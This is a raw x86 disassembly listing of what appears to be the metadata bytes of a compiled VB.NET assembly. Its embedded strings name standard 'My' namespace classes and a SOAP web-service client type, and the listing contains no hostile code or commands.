  4085e2:	3a 03                	cmp    (%ebx),%al
  4085e4:	20 00                	and    %al,(%eax)
  4085e6:	01 05 20 01 01 11    	add    %eax,0x11010120
  4085ec:	0d 08 01 00 01       	or     $0x1000108,%eax
  4085f1:	00 00                	add    %al,(%eax)
  4085f3:	00 00                	add    %al,(%eax)
  4085f5:	00 05 20 02 01 0e    	add    %al,0xe010220
  4085fb:	0e                   	push   %cs
  4085fc:	18 01                	sbb    %al,(%ecx)
  4085fe:	00 0a                	add    %cl,(%edx)
  408600:	4d                   	dec    %ebp
  408601:	79 54                	jns    0x408657
  408603:	65 6d                	gs insl (%dx),%es:(%edi)
  408605:	70 6c                	jo     0x408673
  408607:	61                   	popa
  408608:	74 65                	je     0x40866f
  40860a:	08 31                	or     %dh,(%ecx)
  40860c:	31 2e                	xor    %ebp,(%esi)
  40860e:	30 2e                	xor    %ch,(%esi)
  408610:	30 2e                	xor    %ch,(%esi)
  408612:	30 00                	xor    %al,(%eax)
  408614:	00 04 01             	add    %al,(%ecx,%eax,1)
  408617:	00 00                	add    %al,(%eax)
  408619:	00 07                	add    %al,(%edi)
  40861b:	06                   	push   %es
  40861c:	15 12 18 01 12       	adc    $0x12011812,%eax
  408621:	0c 07                	or     $0x7,%al
  408623:	06                   	push   %es
  408624:	15 12 18 01 12       	adc    $0x12011812,%eax
  408629:	08 07                	or     %al,(%edi)
  40862b:	06                   	push   %es
  40862c:	15 12 18 01 12       	adc    $0x12011812,%eax
  408631:	21 07                	and    %eax,(%edi)
  408633:	06                   	push   %es
  408634:	15 12 18 01 12       	adc    $0x12011812,%eax
  408639:	14 06                	adc    $0x6,%al
  40863b:	15 12 18 01 12       	adc    $0x12011812,%eax
  408640:	0c 06                	or     $0x6,%al
  408642:	15 12 18 01 12       	adc    $0x12011812,%eax
  408647:	08 06                	or     %al,(%esi)
  408649:	15 12 18 01 12       	adc    $0x12011812,%eax
  40864e:	21 06                	and    %eax,(%esi)
  408650:	15 12 18 01 12       	adc    $0x12011812,%eax
  408655:	14 03                	adc    $0x3,%al
  408657:	00 00                	add    %al,(%eax)
  408659:	01 04 20             	add    %eax,(%eax,%eiz,1)
  40865c:	00 13                	add    %dl,(%ebx)
  40865e:	00 04 00             	add    %al,(%eax,%eax,1)
  408661:	00 12                	add    %dl,(%edx)
  408663:	0c 04                	or     $0x4,%al
  408665:	00 00                	add    %al,(%eax)
  408667:	12 08                	adc    (%eax),%cl
  408669:	04 00                	add    $0x0,%al
  40866b:	00 12                	add    %dl,(%edx)
  40866d:	21 04 00             	and    %eax,(%eax,%eax,1)
  408670:	00 12                	add    %dl,(%edx)
  408672:	14 04                	adc    $0x4,%al
  408674:	08 00                	or     %al,(%eax)
  408676:	12 0c 04             	adc    (%esp,%eax,1),%cl
  408679:	20 01                	and    %al,(%ecx)
  40867b:	01 0e                	add    %ecx,(%esi)
  40867d:	10 01                	adc    %al,(%ecx)
  40867f:	00 0b                	add    %cl,(%ebx)
  408681:	4d                   	dec    %ebp
  408682:	79 2e                	jns    0x4086b2
  408684:	43                   	inc    %ebx
  408685:	6f                   	outsl  %ds:(%esi),(%dx)
  408686:	6d                   	insl   (%dx),%es:(%edi)
  408687:	70 75                	jo     0x4086fe
  408689:	74 65                	je     0x4086f0
  40868b:	72 00                	jb     0x40868d
  40868d:	00 04 08             	add    %al,(%eax,%ecx,1)
  408690:	00 12                	add    %dl,(%edx)
  408692:	08 13                	or     %dl,(%ebx)
  408694:	01 00                	add    %eax,(%eax)
  408696:	0e                   	push   %cs
  408697:	4d                   	dec    %ebp
  408698:	79 2e                	jns    0x4086c8
  40869a:	41                   	inc    %ecx
  40869b:	70 70                	jo     0x40870d
  40869d:	6c                   	insb   (%dx),%es:(%edi)
  40869e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4086a5:	00 00                	add    %al,(%eax)
  4086a7:	04 08                	add    $0x8,%al
  4086a9:	00 12                	add    %dl,(%edx)
  4086ab:	21 0c 01             	and    %ecx,(%ecx,%eax,1)
  4086ae:	00 07                	add    %al,(%edi)
  4086b0:	4d                   	dec    %ebp
  4086b1:	79 2e                	jns    0x4086e1
  4086b3:	55                   	push   %ebp
  4086b4:	73 65                	jae    0x40871b
  4086b6:	72 00                	jb     0x4086b8
  4086b8:	00 04 08             	add    %al,(%eax,%ecx,1)
  4086bb:	00 12                	add    %dl,(%edx)
  4086bd:	14 13                	adc    $0x13,%al
  4086bf:	01 00                	add    %eax,(%eax)
  4086c1:	0e                   	push   %cs
  4086c2:	4d                   	dec    %ebp
  4086c3:	79 2e                	jns    0x4086f3
  4086c5:	57                   	push   %edi
  4086c6:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  4086ca:	72 76                	jb     0x408742
  4086cc:	69 63 65 73 00 00 04 	imul   $0x4000073,0x65(%ebx),%esp
  4086d3:	00 01                	add    %al,(%ecx)
  4086d5:	1c 1c                	sbb    $0x1c,%al
  4086d7:	04 20                	add    $0x20,%al
  4086d9:	01 02                	add    %eax,(%edx)
  4086db:	1c 03                	sbb    $0x3,%al
  4086dd:	20 00                	and    %al,(%eax)
  4086df:	08 06                	or     %al,(%esi)
  4086e1:	00 01                	add    %al,(%ecx)
  4086e3:	12 35 11 39 04 20    	adc    0x20043911,%dh
  4086e9:	00 12                	add    %dl,(%edx)
  4086eb:	35 03 20 00 0e       	xor    $0xe002003,%eax
  4086f0:	04 07                	add    $0x7,%al
  4086f2:	01 1e                	add    %ebx,(%esi)
  4086f4:	00 02                	add    %al,(%edx)
  4086f6:	1e                   	push   %ds
  4086f7:	00 05 10 01 00 1e    	add    %al,0x1e000110
  4086fd:	00 04 0a             	add    %al,(%edx,%ecx,1)
  408700:	01 1e                	add    %ebx,(%esi)
  408702:	00 07                	add    %al,(%edi)
  408704:	10 01                	adc    %al,(%ecx)
  408706:	01 1e                	add    %ebx,(%esi)
  408708:	00 1e                	add    %bl,(%esi)
  40870a:	00 07                	add    %al,(%edi)
  40870c:	30 01                	xor    %al,(%ecx)
  40870e:	01 01                	add    %eax,(%ecx)
  408710:	10 1e                	adc    %bl,(%esi)
  408712:	00 07                	add    %al,(%edi)
  408714:	20 04 01             	and    %al,(%ecx,%eax,1)
  408717:	0e                   	push   %cs
  408718:	0e                   	push   %cs
  408719:	0e                   	push   %cs
  40871a:	0e                   	push   %cs
  40871b:	61                   	popa
  40871c:	01 00                	add    %eax,(%eax)
  40871e:	34 53                	xor    $0x53,%al
  408720:	79 73                	jns    0x408795
  408722:	74 65                	je     0x408789
  408724:	6d                   	insl   (%dx),%es:(%edi)
  408725:	2e 57                	cs push %edi
  408727:	65 62 2e             	bound  %ebp,%gs:(%esi)
  40872a:	53                   	push   %ebx
  40872b:	65 72 76             	gs jb  0x4087a4
  40872e:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  408735:	6f                   	outsl  %ds:(%esi),(%dx)
  408736:	74 6f                	je     0x4087a7
  408738:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40873b:	73 2e                	jae    0x40876b
  40873d:	53                   	push   %ebx
  40873e:	6f                   	outsl  %ds:(%esi),(%dx)
  40873f:	61                   	popa
  408740:	70 48                	jo     0x40878a
  408742:	74 74                	je     0x4087b8
  408744:	70 43                	jo     0x408789
  408746:	6c                   	insb   (%dx),%es:(%edi)
  408747:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  40874e:	74 6f                	je     0x4087bf
  408750:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408753:	12 43 72             	adc    0x72(%ebx),%al
  408756:	65 61                	gs popa
  408758:	74 65                	je     0x4087bf
  40875a:	5f                   	pop    %edi
  40875b:	5f                   	pop    %edi
  40875c:	49                   	dec    %ecx
  40875d:	6e                   	outsb  %ds:(%esi),(%dx)
  40875e:	73 74                	jae    0x4087d4
  408760:	61                   	popa
  408761:	6e                   	outsb  %ds:(%esi),(%dx)
  408762:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  408765:	5f                   	pop    %edi
  408766:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  40876a:	70 6f                	jo     0x4087db
  40876c:	73 65                	jae    0x4087d3
  40876e:	5f                   	pop    %edi
  40876f:	5f                   	pop    %edi
  408770:	49                   	dec    %ecx
  408771:	6e                   	outsb  %ds:(%esi),(%dx)
  408772:	73 74                	jae    0x4087e8
  408774:	61                   	popa
  408775:	6e                   	outsb  %ds:(%esi),(%dx)
  408776:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  408779:	5f                   	pop    %edi
  40877a:	00 00                	add    %al,(%eax)
  40877c:	00 03                	add    %al,(%ebx)
  40877e:	06                   	push   %es
  40877f:	13 00                	adc    (%eax),%eax
  408781:	06                   	push   %es
  408782:	15 12 18 01 13       	adc    $0x13011812,%eax
  408787:	00 02                	add    %al,(%edx)
  408789:	13 00                	adc    (%eax),%eax
  40878b:	04 0a                	add    $0xa,%al
  40878d:	01 13                	add    %edx,(%ebx)
  40878f:	00 04 28             	add    %al,(%eax,%ebp,1)
  408792:	00 13                	add    %dl,(%ebx)
  408794:	00 04 20             	add    %al,(%eax,%eiz,1)
  408797:	01 01                	add    %eax,(%ecx)
  408799:	02 05 01 00 00 00    	add    0x1,%al
  40879f:	00 04 00             	add    %al,(%eax,%eax,1)
  4087a2:	01 02                	add    %eax,(%edx)
  4087a4:	0e                   	push   %cs
  4087a5:	05 07 02 1c 12       	add    $0x121c0207,%eax
  4087aa:	51                   	push   %ecx
  4087ab:	03 06                	add    (%esi),%eax
  4087ad:	12 59 05             	adc    0x5(%ecx),%bl
  4087b0:	00 01                	add    %al,(%ecx)
  4087b2:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
  4087b7:	01 12                	add    %edx,(%edx)
  4087b9:	59                   	pop    %ecx
  4087ba:	0e                   	push   %cs
  4087bb:	05 20 02 1c 0e       	add    $0xe1c0220,%eax
  4087c0:	1c 04                	sbb    $0x4,%al
  4087c2:	20 01                	and    %al,(%ecx)
  4087c4:	02 0e                	add    (%esi),%cl
  4087c6:	03 00                	add    (%eax),%eax
  4087c8:	00 02                	add    %al,(%edx)
  4087ca:	04 00                	add    $0x0,%al
  4087cc:	01 0e                	add    %ecx,(%esi)
  4087ce:	0e                   	push   %cs
  4087cf:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4087d4:	0e                   	push   %cs
  4087d5:	03 00                	add    (%eax),%eax
  4087d7:	00 0e                	add    %cl,(%esi)
  4087d9:	07                   	pop    %es
  4087da:	00 04 0e             	add    %al,(%esi,%ecx,1)
  4087dd:	0e                   	push   %cs
  4087de:	0e                   	push   %cs
  4087df:	0e                   	push   %cs
  4087e0:	0e                   	push   %cs
  4087e1:	08 00                	or     %al,(%eax)
  4087e3:	04 08                	add    $0x8,%al
  4087e5:	0e                   	push   %cs
  4087e6:	11 79 02             	adc    %edi,0x2(%ecx)
  4087e9:	08 05 00 01 01 12    	or     %al,0x12010100
  4087ef:	51                   	push   %ecx
  4087f0:	05 00 00 12 80       	add    $0x80120000,%eax
  4087f5:	81 05 20 01 1d 05 0e 	addl   $0x120050e,0x51d0120
  4087fc:	05 20 01 
  4087ff:	0e                   	push   %cs
  408800:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  408805:	0e                   	push   %cs
  408806:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  40880b:	1c 0e                	sbb    $0xe,%al
  40880d:	05 07 02 0e 12       	add    $0x120e0207,%eax
  408812:	51                   	push   %ecx
  408813:	04 00                	add    $0x0,%al
  408815:	01 0e                	add    %ecx,(%esi)
  408817:	1c 05                	sbb    $0x5,%al
  408819:	20 02                	and    %al,(%edx)
  40881b:	01 0e                	add    %ecx,(%esi)
  40881d:	1c 05                	sbb    $0x5,%al
  40881f:	00 02                	add    %al,(%edx)
  408821:	1c 0e                	sbb    $0xe,%al
  408823:	0e                   	push   %cs
  408824:	0a 07                	or     (%edi),%al
  408826:	03 12                	add    (%edx),%edx
  408828:	80 8d 12 80 8d 1d 0e 	orb    $0xe,0x1d8d8012(%ebp)
  40882f:	07                   	pop    %es
  408830:	15 12 80 91 01       	adc    $0x1918012,%eax
  408835:	1d 05 0a 00 04       	sbb    $0x4000a05,%eax
  40883a:	1d 0e 0e 0e 08       	sbb    $0x80e0e0e,%eax
  40883f:	11 80 99 07 20 03    	adc    %eax,0x3200799(%eax)
  408845:	01 1d 05 08 08 04    	add    %ebx,0x4080805
  40884b:	20 00                	and    %al,(%eax)
  40884d:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  408852:	01 13                	add    %edx,(%ebx)
  408854:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40885a:	00 08                	add    %cl,(%eax)
  40885c:	00 02                	add    %al,(%edx)
  40885e:	12 80 a1 1d 05 0e    	adc    0xe051da1(%eax),%al
  408864:	05 20 00 11 80       	add    $0x80110020,%eax
  408869:	a9 07 00 02 01       	test   $0x1020007,%eax
  40886e:	1c 12                	sbb    $0x12,%al
  408870:	80 a5 14 07 08 1d 05 	andb   $0x5,0x1d080714(%ebp)
  408877:	1d 05 12 80 8d       	sbb    $0x8d801205,%eax
  40887c:	1d 05 12 80 8d       	sbb    $0x8d801205,%eax
  408881:	12 80 ad 1d 05 08    	adc    0x8051dad(%eax),%al
  408887:	0a 20                	or     (%eax),%ah
  408889:	03 01                	add    (%ecx),%eax
  40888b:	12 80 9d 11 80 b1    	adc    -0x4e7fee63(%eax),%al
  408891:	02 04 20             	add    (%eax,%eiz,1),%al
  408894:	01 01                	add    %eax,(%ecx)
  408896:	0a 03                	or     (%ebx),%al
  408898:	20 00                	and    %al,(%eax)
  40889a:	0a 07                	or     (%edi),%al
  40889c:	20 03                	and    %al,(%ebx)
  40889e:	08 1d 05 08 08 05    	or     %bl,0x5080805
  4088a4:	20 01                	and    %al,(%ecx)
  4088a6:	01 1d 05 09 20 02    	add    %ebx,0x2200905
  4088ac:	01 12                	add    %edx,(%edx)
  4088ae:	80 9d 11 80 b1 06 00 	sbbb   $0x0,0x6b18011(%ebp)
  4088b5:	02 08                	add    (%eax),%cl
  4088b7:	1d 05 08 08 00       	sbb    $0x80805,%eax
  4088bc:	02 1d 05 1d 05 10    	add    0x10051d05,%bl
  4088c2:	02 01                	add    (%ecx),%al
  4088c4:	02 01                	add    (%ecx),%al
  4088c6:	16                   	push   %ss
  4088c7:	04 00                	add    $0x0,%al
  4088c9:	01 01                	add    %eax,(%ecx)
  4088cb:	0e                   	push   %cs
  4088cc:	02 06                	add    (%esi),%al
  4088ce:	1c 05                	sbb    $0x5,%al
  4088d0:	00 02                	add    %al,(%edx)
  4088d2:	1c 1c                	sbb    $0x1c,%al
  4088d4:	1c 03                	sbb    $0x3,%al
  4088d6:	00 00                	add    %al,(%eax)
  4088d8:	1c 05                	sbb    $0x5,%al
  4088da:	20 00                	and    %al,(%eax)
  4088dc:	12 80 c9 05 20 02    	adc    0x22005c9(%eax),%al
  4088e2:	0e                   	push   %cs
  4088e3:	0e                   	push   %cs
  4088e4:	0e                   	push   %cs
  4088e5:	08 07                	or     %al,(%edi)
  4088e7:	03 0e                	add    (%esi),%ecx
  4088e9:	11 80 cd 12 51 05    	adc    %eax,0x55112cd(%eax)
  4088ef:	20 00                	and    %al,(%eax)
  4088f1:	11 80 cd 04 20 01    	adc    %eax,0x12004cd(%eax)
  4088f7:	0e                   	push   %cs
  4088f8:	0e                   	push   %cs
  4088f9:	06                   	push   %es
  4088fa:	00 03                	add    %al,(%ebx)
  4088fc:	0e                   	push   %cs
  4088fd:	0e                   	push   %cs
  4088fe:	0e                   	push   %cs
  4088ff:	0e                   	push   %cs
  408900:	0f 07                	sysret
  408902:	06                   	push   %es
  408903:	0e                   	push   %cs
  408904:	0e                   	push   %cs
  408905:	12 80 d9 12 80 dd    	adc    -0x227fed27(%eax),%al
  40890b:	12 80 e1 12 51 05    	adc    0x55112e1(%eax),%al
  408911:	20 00                	and    %al,(%eax)
  408913:	12 80 d9 05 20 00    	adc    0x2005d9(%eax),%al
  408919:	12 80 dd 05 20 00    	adc    0x2005dd(%eax),%al
  40891f:	12 80 e9 06 00 03    	adc    0x30006e9(%eax),%al
  408925:	08 0e                	or     %cl,(%esi)
  408927:	0e                   	push   %cs
  408928:	02 04 20             	add    (%eax,%eiz,1),%al
  40892b:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40892e:	03 20                	add    (%eax),%esp
  408930:	00 02                	add    %al,(%edx)
  408932:	0c 07                	or     $0x7,%al
  408934:	06                   	push   %es
  408935:	0e                   	push   %cs
  408936:	1d 05 12 80 ed       	sbb    $0xed801205,%eax
  40893b:	08 08                	or     %cl,(%eax)
  40893d:	12 51 06             	adc    0x6(%ecx),%dl
  408940:	20 01                	and    %al,(%ecx)
  408942:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  408947:	20 01                	and    %al,(%ecx)
  408949:	12 80 ed 0e 0d 07    	adc    0x70d0eed(%eax),%al
  40894f:	05 0e 0e 12 80       	add    $0x80120e0e,%eax
  408954:	f9                   	stc
  408955:	12 80 d9 12 80 dd    	adc    -0x227fed27(%eax),%al
  40895b:	02 06                	add    (%esi),%al
  40895d:	0e                   	push   %cs
  40895e:	08 07                	or     %al,(%edi)
  408960:	03 02                	add    (%edx),%eax
  408962:	12 80 fd 12 51 05    	adc    0x55112fd(%eax),%al
  408968:	00 00                	add    %al,(%eax)
  40896a:	12 80 fd 06 20 01    	adc    0x12006fd(%eax),%al
  408970:	01 12                	add    %edx,(%edx)
  408972:	80 fd 06             	cmp    $0x6,%ch
  408975:	20 01                	and    %al,(%ecx)
  408977:	02 11                	add    (%ecx),%dl
  408979:	81 05 0e 07 06 0e 0e 	addl   $0xd980120e,0xe06070e
  408980:	12 80 d9 
  408983:	12 80 dd 12 51 12    	adc    0x125112dd(%eax),%al
  408989:	51                   	push   %ecx
  40898a:	07                   	pop    %es
  40898b:	00 01                	add    %al,(%ecx)
  40898d:	1d 12 81 09 0e       	sbb    $0xe098112,%eax
  408992:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  408997:	1c 08                	sbb    $0x8,%al
  408999:	07                   	pop    %es
  40899a:	03 0e                	add    (%esi),%ecx
  40899c:	12 80 e1 12 51 0c    	adc    0xc5112e1(%eax),%al
  4089a2:	07                   	pop    %es
  4089a3:	06                   	push   %es
  4089a4:	0e                   	push   %cs
  4089a5:	12 80 ed 1d 0e 08    	adc    0x80e1ded(%eax),%al
  4089ab:	0e                   	push   %cs
  4089ac:	12 51 05             	adc    0x5(%ecx),%dl
  4089af:	20 02                	and    %al,(%edx)
  4089b1:	0e                   	push   %cs
  4089b2:	08 08                	or     %cl,(%eax)
  4089b4:	05 00 01 1d 0e       	add    $0xe1d0100,%eax
  4089b9:	0e                   	push   %cs
  4089ba:	06                   	push   %es
  4089bb:	07                   	pop    %es
  4089bc:	02 12                	add    (%edx),%dl
  4089be:	2c 12                	sub    $0x12,%al
  4089c0:	51                   	push   %ecx
  4089c1:	05 20 00 12 81       	add    $0x81120020,%eax
  4089c6:	15 05 20 02 01       	adc    $0x1022005,%eax
  4089cb:	1c 18                	sbb    $0x18,%al
  4089cd:	06                   	push   %es
  4089ce:	20 01                	and    %al,(%ecx)
  4089d0:	01 12                	add    %edx,(%edx)
  4089d2:	81 19 06 20 01 01    	sbbl   $0x1012006,(%ecx)
  4089d8:	11 81 21 04 20 01    	adc    %eax,0x1200421(%ecx)
  4089de:	01 1c 04             	add    %ebx,(%esp,%eax,1)
  4089e1:	00 01                	add    %al,(%ecx)
  4089e3:	01 08                	add    %ecx,(%eax)
  4089e5:	04 06                	add    $0x6,%al
  4089e7:	12 81 15 05 20 01    	adc    0x1200515(%ecx),%al
  4089ed:	01 12                	add    %edx,(%edx)
  4089ef:	2c 02                	sub    $0x2,%al
  4089f1:	06                   	push   %es
  4089f2:	08 04 06             	or     %al,(%esi,%eax,1)
  4089f5:	12 81 25 02 06 02    	adc    0x2060225(%ecx),%al
  4089fb:	04 00                	add    $0x0,%al
  4089fd:	01 08                	add    %ecx,(%eax)
  4089ff:	0e                   	push   %cs
  408a00:	07                   	pop    %es
  408a01:	00 03                	add    %al,(%ebx)
  408a03:	01 02                	add    %eax,(%edx)
  408a05:	10 02                	adc    %al,(%edx)
  408a07:	02 05 07 02 02 12    	add    0x12020207,%al
  408a0d:	51                   	push   %ecx
  408a0e:	1f                   	pop    %ds
  408a0f:	07                   	pop    %es
  408a10:	0c 1d                	or     $0x1d,%al
  408a12:	0e                   	push   %cs
  408a13:	0e                   	push   %cs
  408a14:	11 81 29 12 81 2d    	adc    %eax,0x2d811229(%ecx)
  408a1a:	11 81 31 12 80 8d    	adc    %eax,-0x727fedcf(%ecx)
  408a20:	12 81 2d 12 81 35    	adc    0x3581122d(%ecx),%al
  408a26:	11 81 29 12 51 02    	adc    %eax,0x2511229(%ecx)
  408a2c:	12 51 05             	adc    0x5(%ecx),%dl
  408a2f:	00 00                	add    %al,(%eax)
  408a31:	12 81 39 05 20 00    	adc    0x200539(%ecx),%al
  408a37:	11 81 29 08 20 03    	adc    %eax,0x3200829(%ecx)
  408a3d:	01 08                	add    %ecx,(%eax)
  408a3f:	08 11                	or     %dl,(%ecx)
  408a41:	81 3d 08 00 01 12 81 	cmpl   $0x81123581,0x12010008
  408a48:	35 12 81 
  408a4b:	41                   	inc    %ecx
  408a4c:	05 20 02 01 08       	add    $0x8010220,%eax
  408a51:	08 0d 20 06 01 08    	or     %cl,0x8010620
  408a57:	08 08                	or     %cl,(%eax)
  408a59:	08 11                	or     %dl,(%ecx)
  408a5b:	81 31 11 81 45 07    	xorl   $0x7458111,(%ecx)
  408a61:	20 04 01             	and    %al,(%ecx,%eax,1)
  408a64:	08 08                	or     %cl,(%eax)
  408a66:	08 08                	or     %cl,(%eax)
  408a68:	0f 20 04             	mov    %cr0,%esp
  408a6b:	01 12                	add    %edx,(%edx)
  408a6d:	81 41 11 81 29 11 81 	addl   $0x81112981,0x11(%ecx)
  408a74:	29 11                	sub    %edx,(%ecx)
  408a76:	81 49 05 00 00 12 81 	orl    $0x81120000,0x5(%ecx)
  408a7d:	4d                   	dec    %ebp
  408a7e:	09 20                	or     %esp,(%eax)
  408a80:	02 01                	add    (%ecx),%al
  408a82:	12 80 9d 12 81 4d    	adc    0x4d81129d(%eax),%al
  408a88:	05 00 01 01 1d       	add    $0x1d010100,%eax
  408a8d:	05 10 07 06 1d       	add    $0x1d060710,%eax
  408a92:	12 35 08 1d 12 81    	adc    0x81121d08,%dh
  408a98:	55                   	push   %ebp
  408a99:	08 12                	or     %dl,(%edx)
  408a9b:	81 55 12 51 05 00 00 	adcl   $0x551,0x12(%ebp)
  408aa2:	12 81 59 07 20 01    	adc    0x1200759(%ecx),%al
  408aa8:	12 81 5d 1d 05 05    	adc    0x5051d5d(%ecx),%al
  408aae:	20 00                	and    %al,(%eax)
  408ab0:	1d 12 35 06 20       	sbb    $0x20063512,%eax
  408ab5:	00 1d 12 81 55 06    	add    %bl,0x6558112
  408abb:	20 02                	and    %al,(%edx)
  408abd:	1c 1c                	sbb    $0x1c,%al
  408abf:	1d 1c 06 00 02       	sbb    $0x200061c,%eax
  408ac4:	01 1d 05 0e 04 00    	add    %ebx,0x40e05
  408aca:	00 00                	add    %al,(%eax)
  408acc:	00 04 06             	add    %al,(%esi,%eax,1)
  408acf:	12 81 6d 04 06 12    	adc    0x1206046d(%ecx),%al
  408ad5:	81 71 04 06 12 81 1d 	xorl   $0x1d811206,0x4(%ecx)
  408adc:	04 06                	add    $0x6,%al
  408ade:	12 80 8d 04 06 12    	adc    0x1206048d(%eax),%al
  408ae4:	81 75 07 06 15 12 80 	xorl   $0x80121506,0x7(%ebp)
  408aeb:	91                   	xchg   %eax,%ecx
  408aec:	01 08                	add    %ecx,(%eax)
  408aee:	06                   	push   %es
  408aef:	20 01                	and    %al,(%ecx)
  408af1:	01 12                	add    %edx,(%edx)
  408af3:	81 79 06 15 12 80 91 	cmpl   $0x91801215,0x6(%ecx)
  408afa:	01 08                	add    %ecx,(%eax)
  408afc:	09 07                	or     %eax,(%edi)
  408afe:	03 1d 05 12 80 a1    	add    0xa1801205,%ebx
  408b04:	12 51 05             	adc    0x5(%ecx),%dl
  408b07:	20 00                	and    %al,(%eax)
  408b09:	12 81 7d 07 20 02    	adc    0x220077d(%ecx),%al
  408b0f:	02 08                	add    (%eax),%cl
  408b11:	11 81 81 0a 20 04    	adc    %eax,0x4200a81(%ecx)
  408b17:	08 1d 05 08 08 11    	or     %bl,0x11080805
  408b1d:	81 85 08 00 03 1c 1c 	addl   $0x1d1c1d1c,0x1c030008(%ebp)
  408b24:	1d 1c 1d 
  408b27:	0e                   	push   %cs
  408b28:	02 1d 05 10 00 07    	add    0x7001005,%bl
  408b2e:	1c 1c                	sbb    $0x1c,%al
  408b30:	12 35 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dh
  408b36:	0e                   	push   %cs
  408b37:	1d 12 35 1d 02       	sbb    $0x21d3512,%eax
  408b3c:	04 00                	add    $0x0,%al
  408b3e:	01 08                	add    %ecx,(%eax)
  408b40:	1c 04                	sbb    $0x4,%al
  408b42:	20 01                	and    %al,(%ecx)
  408b44:	08 08                	or     %cl,(%eax)
  408b46:	19 07                	sbb    %eax,(%edi)
  408b48:	0b 1c 12             	or     (%edx,%edx,1),%ebx
  408b4b:	51                   	push   %ecx
  408b4c:	12 51 12             	adc    0x12(%ecx),%dl
  408b4f:	51                   	push   %ecx
  408b50:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  408b56:	12 81 95 1d 0e 12    	adc    0x120e1d95(%ecx),%al
  408b5c:	51                   	push   %ecx
  408b5d:	02 12                	add    (%edx),%dl
  408b5f:	51                   	push   %ecx
  408b60:	04 20                	add    $0x20,%al
  408b62:	01 01                	add    %eax,(%ecx)
  408b64:	08 06                	or     %al,(%esi)
  408b66:	20 01                	and    %al,(%ecx)
  408b68:	01 12                	add    %edx,(%edx)
  408b6a:	81 99 05 20 02 08 08 	sbbl   $0x20050808,0x8022005(%ecx)
  408b71:	08 05 20 
  408b74:	02 01                	add    (%ecx),%al
  408b76:	0e                   	push   %cs
  408b77:	08 05 00 01 0e 1d    	or     %al,0x1d0e0100
  408b7d:	1c 09                	sbb    $0x9,%al
  408b7f:	20 04 01             	and    %al,(%ecx,%eax,1)
  408b82:	12 81 8d 1c 08 08    	adc    0x8081c8d(%ecx),%al
  408b88:	08 07                	or     %al,(%edi)
  408b8a:	03 12                	add    (%edx),%edx
  408b8c:	80 8d 1c 12 51 04 00 	orb    $0x0,0x451121c(%ebp)
  408b93:	01 01                	add    %eax,(%ecx)
  408b95:	1c 03                	sbb    $0x3,%al
  408b97:	06                   	push   %es
  408b98:	12 40 04             	adc    0x4(%eax),%al
  408b9b:	06                   	push   %es
  408b9c:	12 81 19 04 06 12    	adc    0x12060419(%ecx),%al
  408ba2:	81 8d 0f 07 06 1c 12 	orl    $0x12a58112,0x1c06070f(%ebp)
  408ba9:	81 a5 12 
  408bac:	80 f1 1d             	xor    $0x1d,%cl
  408baf:	05 1d 05 12 51       	add    $0x5112051d,%eax
  408bb4:	0c 00                	or     $0x0,%al
  408bb6:	05 01 12 80 a1       	add    $0xa1801201,%eax
  408bbb:	08 12                	or     %dl,(%edx)
  408bbd:	80 a1 08 08 06 20 01 	andb   $0x1,0x20060808(%ecx)
  408bc4:	01 11                	add    %edx,(%ecx)
  408bc6:	81 ad 05 20 00 12 81 	subl   $0x2008b181,0x12002005(%ebp)
  408bcd:	b1 08 20 
  408bd0:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  408bd6:	08 0a                	or     %cl,(%edx)
  408bd8:	07                   	pop    %es
  408bd9:	04 12                	add    $0x12,%al
  408bdb:	81 91 0e 12 51 12 51 	adcl   $0x1000651,0x1251120e(%ecx)
  408be2:	06 00 01 
  408be5:	12 81 09 0e 06 07    	adc    0x7060e09(%ecx),%al
  408beb:	02 1d 1c 1d 02 06    	add    0x6021d1c,%bl
  408bf1:	00 03                	add    %al,(%ebx)
  408bf3:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  408bf6:	02 11                	add    (%ecx),%dl
  408bf8:	00 08                	add    %cl,(%eax)
  408bfa:	1c 1c                	sbb    $0x1c,%al
  408bfc:	12 35 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dh
  408c02:	0e                   	push   %cs
  408c03:	1d 12 35 1d 02       	sbb    $0x21d3512,%eax
  408c08:	02 06                	add    (%esi),%al
  408c0a:	00 01                	add    %al,(%ecx)
  408c0c:	12 81 bd 0e 0d 07    	adc    0x70d0ebd(%ecx),%al
  408c12:	06                   	push   %es
  408c13:	12 81 c1 1d 05 08    	adc    0x8051dc1(%ecx),%al
  408c19:	08 08                	or     %cl,(%eax)
  408c1b:	12 81 c1 0a 20 03    	adc    0x3200ac1(%ecx),%al
  408c21:	01 0e                	add    %ecx,(%esi)
  408c23:	11 81 c5 11 81 c9    	adc    %eax,-0x367eee3b(%ecx)
  408c29:	04 00                	add    $0x0,%al
  408c2b:	01 01                	add    %eax,(%ecx)
  408c2d:	02 04 07             	add    (%edi,%eax,1),%al
  408c30:	02 08                	add    (%eax),%cl
  408c32:	02 07                	add    (%edi),%al
  408c34:	20 03                	and    %al,(%ebx)
  408c36:	01 02                	add    %eax,(%edx)
  408c38:	0e                   	push   %cs
  408c39:	10 02                	adc    %al,(%edx)
  408c3b:	06                   	push   %es
  408c3c:	00 01                	add    %al,(%ecx)
  408c3e:	01 12                	add    %edx,(%edx)
  408c40:	81 cd 0f 07 09 0e    	or     $0xe09070f,%ebp
  408c46:	0e                   	push   %cs
